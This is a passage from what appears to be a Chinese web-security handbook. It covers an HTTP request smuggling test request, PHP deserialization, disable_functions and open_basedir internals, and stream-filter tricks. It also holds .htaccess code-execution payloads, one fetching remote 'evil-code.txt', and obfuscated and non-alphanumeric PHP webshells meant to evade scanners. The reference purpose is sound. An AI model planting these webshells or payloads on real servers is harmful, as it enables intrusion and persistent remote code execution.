> TE-TE 指前后端服务器都处理 Transfer-Encoding 请求头，但是在容错性上表现不同，例如有的服务器可能会处理 Transfer-encoding ，测试例如：
>
> ```HTTP
> POST / HTTP/1.1\r\n
> Host: example.com\r\n
> ...
> Content-length: 4\r\n
> Transfer-Encoding: chunked\r\n
> Transfer-encoding: cow\r\n
> \r\n
> 5c\r\n
> aPOST / HTTP/1.1\r\n
> Content-Type: application/x-www-form-urlencoded\r\n
> Content-Length: 15\r\n
> \r\n
> x=1\r\n
> 0\r\n
> \r\n
> ```

### 4.17.5  防御

-   禁用后端连接重用

-   确保连接中的所有服务器具有相同的配置

-   拒绝有二义性的请求

### 4.17.6  参考链接

#### RFC

-   [RFC 2616 Hypertext Transfer Protocol -- HTTP/1.1](https://tools.ietf.org/html/rfc2616)

-   [RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing -- HTTP/1.1](https://tools.ietf.org/html/rfc7230)

#### Blog / Whitepaper

-   [HTTP Request Smuggling by chaiml](https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf)

-   [HTTP request smuggling by portswigger](https://portswigger.net/web-security/request-smuggling)

-   [从一道题到协议层攻击之 HTTP 请求走私](https://xz.aliyun.com/t/6654)

-   [HTTP Request Smuggling in 2020](http://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf)

-   [h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)](https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c)

<span id="_bookmark43" class="anchor"></span>CHAPTER 5



# 五. 语言与框架

## 5.1 PHP

### 后门

#### php.ini 构成的后门

> 利用 auto_prepend_file 和 include_path

#### .user.ini 文件构成的 PHP 后门

> .user.ini 可运行于所有以 fastcgi 运行的 server。利用方式同 php.ini

### 反序列化

#### PHP 序列化实现

#### 常见处理器

> PHP 序列化处理共有几种，分别为 php、php_serialize、php_binary 和 WDDX(需要编译时开启支持)，默认为 php，可通过配置中的 session.serialize_handler 修改。

> 如果 PHP 编译时加入了 WDDX 支持，则只能用 WDDX，WDDX 从 PHP 7.4 版本后开始弃用。从 PHP5.5.4 起可以使用 php_serialize。php_serialize 在内部简单地直接使用 serialize/unserialize 函数，并 不会有 php 和 php_binary 所具有的限制。
>
> 其中 PHP 处理器的格式为：键名 + 竖线 + 经过 serialize() 函数序列化处理的值。
>
> 其中 php_binary 处理器的格式为：键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize() 函数序列化处理的值。
>
> 其中 php_serialize 处理器的格式为：经过 serialize() 函数序列化处理的数组。

#### 序列化格式

> 其中 php_serialize 的实现在 php-src/ext/standard/var.c 中，主要函数为 php_var_serialize_intern，序列化后的格式如下：
>

-   ##### boolean

    -   b:\<value\>;

    -   b:1; // true

    -   b:0; // false

-   ##### integer

    -   i:\<value\>;

-   ##### double

    -   d:\<value\>;

-   ##### NULL

    -   N;

- ##### string

  - s:\<length\>:\"\<value\>\";
  - s:1:\"s\";

- ##### array

  - a:\<length\>:{key, value};
  - a:1:{s:4:\"key1\";s:6:\"value1\";} // array(\"key1\" =\> \"value1\");

-   ##### object

    -   O:\<class_name_length\>:\"\<class_name\>\":\<number_of_properties\>:{\<properties\>};

-   ##### reference

    -   指针类型
    -   R:reference;
    -   O:1:\"A\":2:{s:1:\"a\";i:1;s:1:\"b\";R:2;}
    -   $a = new A();\$a-\>a=1;\$a-\>b=&\$a-\>a;

#### private 与 protect

> private 与 protect 变量和 public 变量不同，不能直接设置。
>
> private 属性只能在其被定义的类内部访问， 不会被继承，在属性前加上类名，即 %00className%00 用于标定其是私有的。
>
> protected 属性可以在父类和子类中访问，变量前添加 %00\*%00 用于标定其是受保护的。

#### PHP 反序列化漏洞

> ```
> php 在反序列化的时候会调用 __wakeup / __sleep 等函数，可能会造成代码执行等问题。若没有相关函数，
> 在析构时也会调用相关的析构函数，同样会造成代码执行。
> 另外 __toString / __call 两个函数也有利用的可能。
> 其中 __wakeup 在反序列化时被触发，__destruct 在 GC 时被触发，__toString 在 echo 时被触发, __call在一个未被定义的函数调用时被触发。
> ```
>
> 在一个未被定义的函数调用时被触发。下面提供一个简单的 demo.
>
> ```php
> class Demo
> {
>     public $data;
>     public function __construct($data)
>     {
>         $this->data = $data;
>         echo "construct<br />";
>     }
>     public function __wakeup()
>     {
>     	echo "wake up<br />";
>     }
>     public function __destruct()
>     {
>         echo "Data's value is $this->data. <br />";
>         echo "destruct<br />";
>     }
> }
> var_dump(serialize(new Demo("raw value")));
> ```

> ###### 输出
>
> ```php
> construct
> Data's value is raw value.
> destruct
> string(44) "O:4:"Demo":1:{s:4:"data";s:9:"raw value";}"
> ```
>
> 把序列化的字符串修改一下后，执行 unserialize(\'O:4:\"Demo\":1:{s:4:\"data\";s:15:\"malicious value\";}\');
>
> ###### 输出
>
> ```php
> wake up
> Data's value is malicious value.
> destruct
> ```
>
> 这里看到，值被修改了.
>
> 上面是一个 unserialize() 的简单应用，不难看出，如果 \_\_wakeup() 或者 __desturct() 有敏感操作，比如读写文件、操作数据库，就可以通过函数实现文件读写或者数据读取的行为。
>
> 那么，在 \_\_wakeup() 中加入判断是否可以阻止这个漏洞呢？在 \_\_wakeup() 中我们加入一行代码
>
> ```php
> public function __wakeup()
> {
>     if($this->data != 'raw value') $this->data = 'raw value';
>     echo "wake up<br />";
> }
> ```
>
> 但其实还是可以绕过的，在 PHP5 \< 5.6.25，PHP7 \< 7.0.10 的版本都存在 wakeup 的漏洞。当反序列化中
>
> object 的个数和之前的个数不等时，wakeup 就会被绕过，于是使用下面的 payload
>
> ```php
> unserialize('O:7:"HITCON":1:{s:4:"data";s:15:"malicious value";}');
> ```
>
> ###### 输出
>
> ```php
> Data's value is malicious value.
> destruct
> ```
>
> 这里 wakeup 被绕过，值依旧被修改了。

#### 利用点

> **SoapClient 原生利用**
>
> php 中的 SoapClient 类可以创建 soap 数据报文，在非 wsdl 模式下，SoapClient 的实例反序列化的时候会对第二个参数指明的 url 进行 soap 请求，该特性可用于 SSRF。
>
> ##### ZipArchive 原生利用
>
> php 原生类 ZipArchive::open() 中的 flag 参数如果设置为 ZipArchive::OVERWRITE 时，会删除指定文件，该特性在一定条件下可以用于删除文件。

#### Session

> PHP 中 session 默认是以文件形式存储的，文件以 sess_sessionid 命名，在 session 一定程度可控的情况下，可通过 session 触发反序列化。

#### 相关 CVE

> **CVE-2016-7124**
>
> 在 PHP 5.6.25 之前版本和 7.0.10 之前的版本，当对象的属性 (变量) 数大于实际的个数时， \_\_wakeup() 不会被执行。

### Disable Functions

#### 机制实现

> PHP 中 Disable Function 的实现是在 php-src/Zend/Zend-API.c 中。PHP 在启动时，读取配置文件中禁止的函数，逐一根据禁止的函数名调用 zend_disable_function 来实现禁止的效果。
>
> 这个函数根据函数名在内置函数列表中找到对应的位置并修改掉，当前版本的代码如下：
>
> ```php
> ZEND_API int zend_disable_function(char *function_name, size_t function_name_length) /* {{{ */
> {
> 	zend_internal_function *func;
> 	if ((func = zend_hash_str_find_ptr(CG(function_table), function_name, function_name_length))) {
> 		zend_free_internal_arg_info(func);
> 		func->fn_flags &= ~(ZEND_ACC_VARIADIC | ZEND_ACC_HAS_TYPE_HINTS | 			ZEND_ACC_HAS_RETURN_TYPE);
> 		func->num_args = 0;
> 		func->arg_info = NULL;
> 		func->handler = ZEND_FN(display_disabled_function);
> 		return SUCCESS;
> 		}
> 	return FAILURE;
> }
> ```
>
> 和函数的实现方式类似，disable classes 也是这样实现的
>
> ```php
> ZEND_API int zend_disable_class(char *class_name, size_t class_name_length) /* {{{ */
> {
> 	zend_class_entry *disabled_class;
> 	zend_string *key;
> 	key = zend_string_alloc(class_name_length, 0);
> 	zend_str_tolower_copy(ZSTR_VAL(key), class_name, class_name_length);
> 	disabled_class = zend_hash_find_ptr(CG(class_table), key);
> 	zend_string_release_ex(key, 0);
> 	if (!disabled_class) {
> 		return FAILURE;
> 	}
> 	INIT_CLASS_ENTRY_INIT_METHODS((*disabled_class), disabled_class_new);
> 	disabled_class->create_object = display_disabled_class;
> 	zend_hash_clean(&disabled_class->function_table);
> 	return SUCCESS;
> }
> ```
>
> 因为这个实现机制的原因，在 PHP 启动后通过 ini_set 来修改 disable_functions 或 disable_classes
>
> 是无效的。

#### Bypass

-   **LD_PRELOAD 绕过**

    -   <https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD>

    -   mail() + putenv

-   PHP OPcache

-   Mail 函数

-   ##### imap_open

    -   <https://www.cvedetails.com/cve/cve-2018-19518>


### Open Basedir

#### 机制实现

> PHP 中 Disable Function 的实现是在 php-src/main/fopen-wrappers.c 中，实现方式是在调用文件等相关操作时调用函数根据路径来检查是否在 basedir 内，其中一部分实现代码如下：
>
> ```php
> PHPAPI int php_check_open_basedir_ex(const char *path, int warn)
> {
> 	/* Only check when open_basedir is available */
> 	if (PG(open_basedir) && *PG(open_basedir)) {
> 		char *pathbuf;
> 		char *ptr;
> 		char *end;
> 		/* Check if the path is too long so we can give a more useful error* message. 			*/
> 		if (strlen(path) > (MAXPATHLEN - 1)) {
> 			php_error_docref(NULL, E_WARNING, "File name is longer than the maximum␣
> 			allowed path length on this platform (%d): %s", MAXPATHLEN, path);
> 			errno = EINVAL;
> 			return -1;
> 		}
> 		pathbuf = estrdup(PG(open_basedir));
> 		ptr = pathbuf;
> 		while (ptr && *ptr) {
>     		end = strchr(ptr, DEFAULT_DIR_SEPARATOR);
> 			if (end != NULL) {
> 				*end = '\0';
> 				end++;
> 			}
> 			if (php_check_specific_open_basedir(ptr, path) == 0) {
> 				efree(pathbuf);
> 				return 0;
> 			}
> 			ptr = end;
> 		}
> 		if (warn) {
> 			php_error_docref(NULL, E_WARNING, "open_basedir restriction in effect. File(%s) is not within the allowed path(s): (%s)", path, PG(open_basedir));
> 		}
> 		efree(pathbuf);
> 		errno = EPERM; /* we deny permission to open it */
> 		return -1;
> 	}
> 	/* Nothing to check... */
> 	return 0;
> }
> ```

### 安全相关配置

#### 函数与类限制

> 可通过 disable_functions / disable_classes 限制 PHP 可调用的函数和类。

#### 目录访问限制

> 可通过 open_basedir 限制 PHP 可访问的目录。

#### 远程引用限制

> 可通过 all_url_include 限制远程文件包含，默认关闭。可通过 allow_url_fopen 限制打开远程文件，默认开启。

#### Session

##### Session.Save

> PHP 的 Session 默认 handler 为文件，存储在 php.ini 的 session.save_path 中，若有任意读写文件的权限，则可修改或读取 session。从 phpinfo 中可获得 session 位置。

##### Session.Upload

> PHP 默认开启了 session.upload_progress.enabled ，该选项会导致生成上传进度文件，其存储路径可以在 phpinfo 中获取。
>
> 那么可以构造特别的报文向服务器发送，在有 LFI 的情况下即可利用。

### PHP 流

#### 简介

> 流（Streams）的概念是在 php 4.3 引入的，是对流式数据的抽象，用于统一数据操作，比如文件数据、网络数据、压缩数据等。
>
> 流可以通过 file、open、fwrite、fclose、file_get_contents、file_put_contents 等函数操作。

#### 封装协议

> PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、copy()、file_exists() 和 filesize() 的文件系统函数。支持的协议可用 stream_get_wrappers() 查看。

-   file:// 访问本地文件系统

-   http:// 访问 HTTP(s) 网址

-   ftp:// 访问 FTP(s) URLs

-   php:// 访问各个输入/输出流（I/O streams）

-   zlib:// 压缩流

-   data:// 数据（RFC 2397）

-   glob:// 查找匹配的文件路径模式

-   phar:// PHP 归档

-   ssh2:// Secure Shell 2

-   rar:// RAR

-   ogg:// 音频流

-   expect:// 处理交互式的流

#### PHP 支持流

> PHP 提供了一些输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。
>
> 需要注意的是，流不受 allow_url_fopen 限制，但是 php://input、php://stdin、php://memory 和 php:/
>
> /temp 受限于 allow_url_include 。

#### 输入输出流

> php://stdin 、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。数据流引用了复制的文件描述符，所以如果在打开 php://stdin 并在之后关了它，仅是关闭了复制品，真正被引用的 STDIN 并不受影响。
>
> 其中 php://stdin 是只读的，php://stdout 和 php://stderr 是只写的。

#### fd

> php://fd 允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。

#### memory 与 temp

> php://memory 和 php://temp 是一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。
>
> php://temp 的内存限制可通过添加 /maxmemory:NN 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。

#### input

> php://input 是个可以访问请求的原始数据的只读流。POST 请求的情况下，最好使用 php://input 来代替
>
> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}\$HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。而 ，这样的情况下 \$HTTP_RAW_POST_DATA默认没有填充，比激活 always_populate_raw_post_data 潜在需要更少的内存。enctype=\"multipart/ form-data\" 的时候 php://input 是无效的。

#### filter

> php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。PHP 默认提供了一些流过滤器，除此之外，还可以使用各种自定义过滤器。
>
> filter 有 resource, read, write 三个参数，resource 参数是必须的。它指定了你要筛选过滤的数据流。read 和
>
> write 是可选参数，可以设定一个或多个过滤器名称，以管道符（\|）分隔。

#### 过滤器列表

> 可以通过 stream_get_filters() 获取已经注册的过滤器列表。其中 PHP 内置的过滤器如下：

-   ##### 字符串过滤器

    -   string.rot13

    -   string.toupper

    -   string.tolower

    -   string.strip_tags

-   ##### 转换过滤器

    -   convert.base64-encode

    -   convert.base64-decode

    -   convert.quoted-printable-encode

    -   convert.quoted-printable-decode

    -   convert.iconv.\*

-   ##### 压缩过滤器

    -   zlib.deflate

    -   zlib.inflate

    -   bzip2.compress

    -   bzip2.decompress

-   ##### 加密过滤器

    -   mcrypt.''ciphername''

    -   mdecrypt.''ciphername''

#### 过滤器利用 tricks

-   ##### LFI

    -   php://filter/convert.base64-encode/resource=index.php

-   XXE 读取文件时会因而解析报错，可用 base64 编码

-   base64 编码会弃掉未在码表内的字符，可用于绕过一些文件格式

-   部分 convert 会有大量的资源消耗，可用作 DoS

-   rot13 / convert 转换过 WAF

### htaccess injection payload

#### file inclusion

```php
php_value auto_append_file /etc/hosts
```

#### code execution

```php
php_value auto_append_file .htaccess
#<?php phpinfo();
```

#### file inclusion

```php
php_flag allow_url_include 1
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
#php_value auto_append_file https://sektioneins.de/evil-code.txt
```

#### code execution with UTF-7

```php
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
php_value auto_append_file .htaccess
#+ADw?php phpinfo()+ADs
```

#### Source code disclosure

```php
php_flag engine 0
```

### WebShell

#### 常见变形

-   **GLOBALS**

    -   eval(\$GLOBALS\[\'\_POST\'\]\[\'op\'\]);

-   #### \$\_FILE

    -   eval(\$\_FILE\[\'name\'\]);

- #### 拆分

  - eval(\${\"\_PO\".\"ST\"} \[\'sz\'\]);

- #### 动态函数执行

  - \$k=\"ass\".\"ert\"; \$k(\${\"\_PO\".\"ST\"} \[\'sz\'\]);
  - \$a=\$\_GET\[\'a\'\];\$a(\$\_GET\[\'b\'\]);

- #### create_function

  -   \$function = create_function(\'\$code\',strrev(\'lave\').\'(\'.strrev(\'TEG\_\$\'). \'\[\"code\"\]);\');\$function();
  -   preg_replace

-   #### 变形

    -   str_replace(" ", "e v a l")

- #### 进制转化

  - \"\\x62\\x61\\163\\x65\\x36\\x34\\137\\144\\145\\x63\\x6f\\144\\145\"

- #### 进制运算

  - (\"#\"\^\"\|\").(\".\"\^\"\~\").(\"/\"\^\"\`\").(\"\|\"\^\"/\").(\"{\"\^\"/\");

- #### 自增运算

  - \$a=\"a\";\$a++;

- #### 强制类型转换

  - \$a=\'\';\$a.=\[\]; // Array

-   #### 利用文件名

    -   FILE

- #### 注释

  - \$a=\"e\".\"v\"./\*-/\*-\*/\"a\"./\*-\*/\"l\";

- #### 反射

  - ReflectionFunction

#### Bypass

- ##### 基于少见函数

  - mb_eregi_replace(\'.\*\',\$\_GET\[1\],\'\',\'e\');
  - set_error_handler + trigger_error

-   ##### 基于污染传播

    -   putenv(\$\_GET\[\"c\"\]);eval(getenv(\'path\'));

    -   parse_str

    -   parse_url

    -   extract

    -   token_get_all

    -   define

-   ##### 基于少见源

    -   \$a = filter_input(INPUT_GET,\'c\');

    -   eval(end(getallheaders()));

    -   get_defined_vars

    -   getallheaders

    -   get_meta_tags

    -   phpinfo

    -   外部变量 / 文件信息

    -   重载 toString

#### 字符串变形函数

-   base64_decode

-   base64_encode

-   str_replace

-   str_rot13

-   strtok

-   strtolower

-   strtoupper

-   strtr

-   substr

-   substr_replace

-   trim

-   ucfirst

-   ucwords

#### 回调函数

-   array_filter

-   array_map

-   array_reduce

-   array_walk

-   array_walk

-   array_walk_recursive

-   call_user_func

-   call_user_func_array

-   filter_var

-   filter_var_array

-   preg_replace_callback

-   register_tick_function

-   registregister_shutdown_function

-   uasort

-   uksort

#### 加解密函数

-   mcrypt_encrypt

-   openssl_encrypt

#### 其他执行方式

-   FFI

-   SimpleXML

-   SimpleXMLElement

#### 自定义函数

使用自定义的加解密函数，在一定程度上可以绕过一些防护软件的查杀，下面的代码是一个基于十六进制的执行的简单例子。

```php
$string='';
$password='password';
if(isset($_POST[$password])){
    $hex=$_POST[$password];
    for($i=0;$i<strlen($hex)-1;$i+=2){
        $string.=chr(hexdec($hex[$i].$hex[$i+1]));
    }
}
eval($string);
```



#### 特殊字符 Shell

PHP 的字符串可以在进行异或、自增运算的时候，会直接进行运算，故可以使用特殊字符来构成 Shell。

```shell
<?=`{${~"\xa0\xb8\xba\xab"}[~"\xa0"]}`;
```

```shell
@$_++;
$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");
@${$__}[!$_](${$__}[$_]);
```

```shell
$_=[];
$_=@"$_";//$_='Array';
$_=$_['!'=='@'];//$_=$_[0];
$___=$_;//A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__,→++;$__++;$__++;$__++;
$___.=$__;//S
$___.=$__;//S
$__=$_;
$__++;$__++;$__++;$__++;//E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__,→++;$__++;$__++;//R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__,→++;$__++;$__++;$__++;$__++;//T
$___.=$__;
$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__,→++;//P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__,→++;$__++;$__++;$__++;//S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__,→++;$__++;$__++;$__++;$__++;//T
$____.=$__;

$_=$$____;
$___(base64_decode($_[_]));
```

#### 检测对抗

-   基于混淆影响程序分析
-   基于动态变量影响程序执行
-   抛出异常打断数据流分析
-   基于反射打断数据流分析
-   基于引用传递打断数据流分析


### 代码混淆

PHP 代码混淆有多种方案，包括加密文件、混淆、基于虚拟机加密、基于 opcode 加密、基于扩展加密等。

加密文件是指直接加密所有 php 文件，通过特定方式解密后通过 eval 等方式执行，这种方式最容易被还原。混淆是移除变量名并通过 AST 一定程度改变代码组织方式以降低代码可读性的方法，这种方式可以通过对应的反向替换来做到部分还原。基于虚拟机的方式自己实现了一个虚拟机，将 PHP 转换为特定的代码，这种方式基本无法还原但是执行效率很低。基于 opcode 加密是 zend guard 等工具使用的方法，将代码编译为 opcode 后再执行。基于扩展的加密需要引入额外的扩展，实现增加垃圾代码、修改控制流、加密明文字符串等操作。

### Phar

#### 简介

Phar（PHP Archive）文件是一种打包格式，将 PHP 代码文件和其他资源放入一个文件中来实现应用程序和库的分发。

在来自 Secarma 的安全研究员 Sam Thomas 在 18 年的 Black Hat 上提出后利用方式后，开始受到广泛的关注。

Phar 可利用是因为 Phar 以序列化的形式存储用户自定义的 meta-data，而以流的形式打开的时候，会自动反序列化，从而触发对应的攻击载荷。

#### Phar 文件结构

Phar 由四个部分组成，分别是 stub / manifest / 文件内容 / 签名。stub 需要 HALT_COMPILER(); 这个调用在 PHP 代码中。

manifest 包含压缩文件的权限、属性、序列化形式存储的 meta-data 等信息，这是攻击的核心部分，主要就是解析 Phar 时对 meta-data 的反序列化。

#### 原理

phar 的实现在 php-src/ext/phar/phar.c 中，主要是 phar_parse_metadata 函数在解析 phar 文件时调用了 php_var_unserialize ，因而造成问题。

而 php 在文件流处理过程中会调用\_php_stream_stat_path(/main/streams/streams.c) ，而后间接调用phar_wrapper_stat ，所以大量的文件操作函数都可以触发 phar 的反序列问题。

目前已知部分的触发函数有:

> **fileatime / filectime / filemtime /stat / fileinode / fileowner / filegroup / fileperms / file / file_get_contents**
>
> **/ readfile / fopen / file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable / parse_ini_file / unlink / copy / exif_thumbnail / exif_imagetype / imageloadfont / image- createfrom\*\*\* / hash_hmac_file / hash_file / hash_update_file / md5_file / sha1_file / get_meta_tags**
>
> **/ get_headers / getimagesize / getimagesizefromstring**

### Sink

#### 任意代码执行

-   eval

-   assert

-   call_user_func

#### 执行系统命令

-   pcntl_exec

-   exec

-   passthru

-   popen

-   shell_exec

-   system

-   proc_open

#### Magic 函数

-   __construct() 构建对象的时被调用

-   __destruct() 销毁对象或脚本结束时被调用

-   __call() 调用不可访问或不存在的方法时被调用

-   __callStatic() 调用不可访问或不存在的静态方法时被调用

-   __get() 读取不可访问或不存在属性时被调用

-   __set() 给不可访问或不存在属性赋值时被调用

-   __isset() 对不可访问或不存在的属性调用 isset 或 empty() 时被调用

-   __unset() 对不可访问或不存在的属性进行 unset 时被调用

-   __sleep() 对象序列化时被调用

-   __wakeup() 对象反序列化时被调用，其中序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过 wakeup 的执行

-   __toString() 当一个类被转换成字符串时被调用

-   __invoke() 对象被以函数方式调用时被调用

-   __set_state() 调用 var_export() 导出类时被调用

-   __clone() 进行对象 clone 时被调用

-   __debugInfo() 调用 var_dump() 打印对象时被调用

#### 文件相关敏感函数

-   move_uploaded_file

-   file_put_contents / file_get_contents

-   unlink

-   fopen / fgets

#### SSRF

-   file_get_contents()

-   fsockopen()

-   curl_exec()

-   fopen()

-   readfile()

#### phar 触发点

-   fileatime / filectime / filemtime

-   stat / fileinode / fileowner / filegroup / fileperms

-   file / file_get_contents / readfile / fopen'

-   file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable

-   parse_ini_file

-   unlink

-   copy

- ##### exif

  - exif_thumbnail
  - exif_imagetype

- ##### gd

  - imageloadfont
  - imagecreatefrom***

- #### hash

  - hash_hmac_file
  - hash_file

  - hash_update_file

  - md5_file

  - sha1_file

-   #### file / url

    -   get_meta_tags

    -   get_headers

-   #### standard

    -   getimagesize
-   getimagesizefromstring

#### 原生类利用

-   **XSS**
    - Error
    - Exception
-   **SSRF**
    - SoapClient

-   #### open_basedir 绕过

    -   DirectoryIterator 结合 glob://

-   #### XXE

    -   SimpleXMLElement


### 其它

#### 低精度

php 中并不是用高精度来存储浮点数，而是用使用 IEEE 754 双精度格式，造成在涉及到浮点数比较的时候可能会出现预期之外的错误。比如 php -r \"var_dump(0.2+0.7==0.9);\" 这行代码的输出是 bool(false)而不是 bool(true)。这在一些情况下可能出现问题。

#### 弱类型

如果使用 == 来判断相等，则会因为类型推断出现一些预料之外的行为，比如 magic hash，指当两个 md5 值都是 0e\[0-9\]{30} 的时候，就会认为两个 hash 值相等。另外在判断字符串和数字的时候，PHP 会自动做类型转换，那么 1==\"1a.php\" 的结果会是 true

另外在判断一些 hash 时，如果传入的是数组，返回值会为 NULL, 因此在判断来自网络请求的数据的哈希值时需要先判断数据类型。

同样的，strcmp() ereg() strpos() 这些函数在处理数组的时候也会异常，返回 NULL。

#### 命令执行

preg_replace 第一个参数是//e 的时候，第二个参数会被当作命令执行

#### 截断

PHP 字符存在截断行为，可以使用 ereg / %00 / iconv 等实现 php 字符截断的操作，从而触发漏洞。

#### 变量覆盖

当使用 extract / parse_str 等函数时，或者使用 php 的 \$\$ 特性时，如果没有正确的调用，则可能使得用户可以任意修改变量。

#### php 特性

-   php 自身在解析请求的时候，如果参数名字中包含" "、"."、"\[" 这几个字符，会将他们转换成下划线

-   由于历史原因，urlencode 和 RFC3896 存在一定的不同，PHP 另外提供了 rawurlencode 对 RFC3896完成标准的实现

#### /tmp 临时文件竞争

phpinfo 可访问时，可以看到上传的临时文件的路径，从而实现 LFI。

### 版本安全改动

#### 8.0

-   字符串与数字弱类型比较将首先将数字转为字符串，然后比较两个字符串

-   内部参数内省错误时抛出异常而不是警告

-   assert 不再支持执行代码

-   移除 create_function

-   移除 mb_ereg_replace() 中的 e 模式

-   Phar 中的元信息不再自动进行反序列化

-   parse_str 必须传入第二个参数

-   移除 php://filter 中的 string.strip_tags

#### 7.2

-   不带引号的字符串会产生 E_WARNING

-   create_function 被废弃

-   assert 不能传入字符串表达式

-   不带第二个参数的情况下使用 parse_str() 会产生 E_DEPRECATED 警告

-   __autoload() 被废弃

#### 7.1

-   调用用户定义的函数提供的参数不足会抛出错误异常而不是警告

-   在不完整的对象上不再调用析构方法

-   call_user_func() 不再支持对传址的函数的调用

-   mb_ereg_replace() 和 mb_eregi_replace() 的 e 模式修饰符被废弃

-   ext/mcrypt 被废弃

#### 7.0

-   preg_replace "e" 修饰符产生 E_WARNING 错误且失效

-   移除所有 ext/mysql 函数

-   移除所有 ext/mssql 函数

-   移除 call_user_method() 和 call_user_method_array()

-   foreach 不再改变内部数组指针

-   在之前，一个八进制字符如果含有无效数字，该无效数字将被静默删节 ( 0128 将被解析为 012)，现在这样的八进制字符将产生解析错误

-   十六进制字符串不再被认为是数字

-   dl() 在 PHP-FPM 不再可用，在 CLI 和 embed SAPIs 中仍可用

-   移除 ASP 和 script PHP 标签，即 \<% %\> / \<%= %\> / \<script language=\"php\"\> \</script\>

-   在数值溢出的时候，内部函数将会失败

-   \$HTTP_RAW_POST_DATA 被移除

#### 5.6

-   \$HTTP_RAW_POST_DATA 被废弃

-   必须先设置 CURLOPT_SAFE_UPLOAD 为 FALSE 才能够使用 \@file 语法来上传文件

#### 5.5

-   preg_replace "e" 修饰符产生 E_DEPRECATED 错误

-   废弃 mysql\_\* 系列函数

#### 5.4

-   不再支持安全模式
-   移除魔术引号
-   数组转换成字符串将产生一条 E_NOTICE 级别的错误


### Tricks

-   is_numeric 前后有空格时，不会判断为 true

-   松散比较时，两个 0e 开头的不同哈希会判断为相等

-   松散比较时，非数字的字符串序列和数字比较会自动转换

-   strcmp/ereg 等函数在传入参数类型为数组时会有非预期行为

### 参考链接

#### Bypass

-   [php open basedir bypass](https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/)

-   [open basedir bypass](https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/)

-   [Bypass Disable functions Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)

#### Tricks

-   [php wrappers](https://www.ptsecurity.com/upload/corporate/ru-ru/webinars/ics/%D0%90.%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B8%D0%BD_%D0%9E_%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF_%D0%B8%D1%81%D0%BF_%D0%A0%D0%9D%D0%A0_wrappers.pdf)

-   [反序列化之 PHP 原生类的利用](http://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html)

-   [php 解密的数种方法](https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html)

-   [Surprising CTF task solution using php://filter](https://gynvael.coldwind.pl/?id=671)

-   [主机安全洋葱 Webshell 检测实践与思考](https://mp.weixin.qq.com/s/ol70aVdvybzMJmtfxaAAZQ)

#### WebShell

-   [PHP htaccess inject](https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet)

-   [php 木马加密](https://blog.manchestergreyhats.co.uk/2018/11/07/php-malware-examination/)

-   [PHP WebShell 变形技术总结](https://www.freebuf.com/articles/web/155891.html)

-   [一些不包含数字和字母的 webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)

-   [PHP Webshell 那些事-攻击篇](https://mp.weixin.qq.com/s/FgzIm-IK02rjEf3JvxOxrw)

#### Phar

-   [US Black Hat 2018 Phar](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf)

-   [利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)

-   [Phar 与 Stream Wrapper 造成 PHP RCE 的深入挖掘](https://blog.zsxsoft.com/post/38)

#### 运行

-   [Learning the PHP lifecycle](http://www.phpinternalsbook.com/php7/extensions_design/php_lifecycle.html)

